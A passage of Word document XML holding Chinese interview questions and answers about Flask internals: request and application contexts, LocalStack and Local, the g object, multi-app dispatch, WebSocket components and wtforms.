          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>RequestContext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3852622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app</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g</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>AppContext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8CAAB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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>并通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>LocalStack</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>requestcontext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>appcontext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>放入</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类中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7E16E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2</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视图函数中</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p>
    <w:p w14:paraId="76428A3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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>localproxy---&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>偏函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>---&gt;localstack---&gt;local</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BE480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3</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请求响应时</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p>
    <w:p w14:paraId="408067D6" w14:textId="1AEE09C0"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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>先执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>save.session()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>再各自执行</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pop(),</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</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中的数据清除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191C4C9E" w14:textId="04C5394C"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中的</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB4150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g</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是贯穿于一次请求的全局变量，当请求进来将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>current_app</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装为一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>APPContext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3096856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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>再通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>LocalStack</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Appcontext</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>放入</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中，取值时通过偏函数在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>LocalStack</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中取值；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADD0D44" w14:textId="3ADFDAA5"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响应时将</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中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据删除：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D52C663" w14:textId="208DE581" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00652BA5"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068</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中上下文管理主要涉及到了那些相关的类？并描述类主要作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B91B8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RequestContext  #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装进来的请求（赋值给</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ctx</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50566BD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AppContext      #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>封装</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app_ctx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E748D1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LocalStack      #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</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对象中的数据维护成一个栈（先进后出）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B836907" w14:textId="30F268D6"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Local           #</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>保存请求上下文对象和</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上下文对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B60E6F7" w14:textId="2B69A816"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>69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为什么要</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把</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Local</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>对象中的的值</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">stack </w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>维护成一个列表？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F897F2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因为通过维护成列表，可以实现一个栈的数据结构，进栈出栈时只取一个数据，巧妙的简化了问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DECFF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还有，在多</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应用时，可以实现数据隔离；列表里不会加数据，而是会生成一个新的列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0A2A5F" w14:textId="204D2581"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local</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一个字典，字典里</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>key</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stack</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）是唯一标识，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>value</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>是一个列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA711D1" w14:textId="49ADCBFC"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070</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中多</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>应用是怎么完成？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A635B5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请求进来时，可以根据</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的不同，交给不同的</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处理。蓝图也可以实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B2E47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#app1 = Flask('app01')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49F4030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#app2 = Flask('app02')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3125BE5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#@app1.route('/index')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10033D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#@app2.route('/index2')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6751F54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源码中在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>DispatcherMiddleware</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>类里调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app2.__call__</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3B78A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原理其实就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>分割，然后将请求分发给指定的</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D69170" w14:textId="2B1BF7AF"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之后</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也按单</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的流程走。就是从</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>app.__call__</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>走。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F964078" w14:textId="77C71CB8"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>71</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在</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中实现</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>需要什么组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFF84D8" w14:textId="07630461"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gevent-websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B98487B" w14:textId="40C82F4C"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072</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wtforms</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>组件的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6510AA" w14:textId="638A186C"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快速创建前端标签、文本校验；如</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
